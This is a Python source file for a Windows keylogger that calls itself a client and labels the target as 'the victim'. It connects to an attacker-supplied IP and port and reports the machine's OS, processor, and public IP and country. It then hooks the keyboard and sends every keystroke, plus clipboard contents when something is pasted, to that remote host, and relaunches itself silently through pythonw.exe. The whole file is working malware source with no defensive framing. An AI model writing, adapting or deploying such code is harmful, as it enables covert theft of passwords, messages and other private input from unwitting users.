# -*- coding: utf-8 -*-
import socket
import platform
import requests
from lxml import html
import pyHook
import sys
import os
import pythoncom
import time
import win32clipboard
import select
import subprocess

BLUE = '\33[94m'
LightBlue = '\033[94m'
RED = '\033[91m'
WHITE = '\33[97m'
YELLOW = '\33[93m'
GREEN = '\033[32m'
LightCyan = "\033[96m"
END = '\033[0m'
ERASE_LINE = '\x1b[2K'
#-----------------------
IP = sys.argv[2]
PORT = int(sys.argv[1])
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}


class Keylogger():

    def __init__(self):
        self.conn = self.Get_Connection()
        self.path = os.path.dirname(__file__)


    def Get_Connection(self):
        SERVER_ADD = (IP, PORT)
        my_socket = socket.socket()
        my_socket.connect(SERVER_ADD)
        return my_socket


    def KeyLoggerMain(self):
        t = self.conn.recv(1024)
        print t
        hm = pyHook.HookManager()
        hm.KeyDown = self.OnKeyboardEvent
        hm.HookKeyboard()
        t1 = time.time()
        while True:
            t2 = time.time()
            if(t2-t1 >=int(t)):
                break
            pythoncom.PumpWaitingMessages()



    def OnKeyboardEvent(self, event):
        """Function is called everytime a key is pressed
         to add that key to the list of captured keys"""
        paste_limit = 500

        if (event.KeyID == 8):
            logs = "[BACKSPACE]"
        elif (event.KeyID == 9):
            logs = "[TAB]"
        elif (event.KeyID == 13):
            logs = "[ENTER]"
        elif (event.KeyID == 37):
            logs = "[LEFT]"
        elif (event.KeyID == 38):
            logs = "[UP]"
        elif (event.KeyID == 39):
            logs = "[RIGHT]"
        elif (event.KeyID == 40):
            logs = "[DOWN]"
        else:
            if event.Ascii > 32 and event.Ascii < 127:
                logs = chr(event.Ascii)
            else:
                if(event.Key == "Space"):
                    logs = " "
                elif event.Key == "V":
                    win32clipboard.OpenClipboard()
                    pasted_value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    if(len(pasted_value) < paste_limit):
                        logs = "[PASTED] - " + pasted_value
                else:
                    logs = ""

        self.conn.send(str(logs))
        print("Sent!")



    def GetIp(self):
        with requests.Session() as s:
            url = 'https://iplocation.com'
            r = s.get(url, headers=headers)
            tree = html.fromstring(r.content)
            ip = tree.xpath('//b[@class="ip"]/text()')
            res = "The IP of the victim is: " + ip[0] + "\n"
            country = tree.xpath('//span[@class="country_name"]/text()')
            res = res + "The victim's country is: " + country[0]
            return res


    def Options(self):
            ch = self.conn.recv(1024)
            if(ch ==str(1)):
                print("Ok")
                self.KeyLoggerMain()
                print("Done!")
                ans = self.conn.recv(1024)
                if(ans == "N" or ans == "n"):
                    return False
            return True


    def main(self):


        "-------------------INFO-------------------"
        print(self.path)
        info = "Info about the Victim system:" + "\n" + "The Operating System is: " + platform.platform() + "\n" + "The system Processor is: " + platform.processor() + "\n" + "The Platform mashine is: " + platform.machine() +"\n"
        res = self.GetIp()
        op1 = "\n" + "\n" + LightCyan +'[?] '+YELLOW +'To acess the KeyLogger Press: 1 '+ RED + END + "\n"
        self.conn.send(GREEN + info + res + op1 + END)
        "-------------------Options-------------------"

        res1 = self.Options()
        print(res1)
        if (res1 == True):
            print(123)
            self.conn.close()
            subprocess.Popen(self.path +  "\\..\\Python27\\pythonw.exe " + self.path + "\KeyloggerClientNew.py " + str(PORT) + " " +  IP)

    "-------------------Options-------------------"


keylogger_class = Keylogger()
keylogger_class.main()



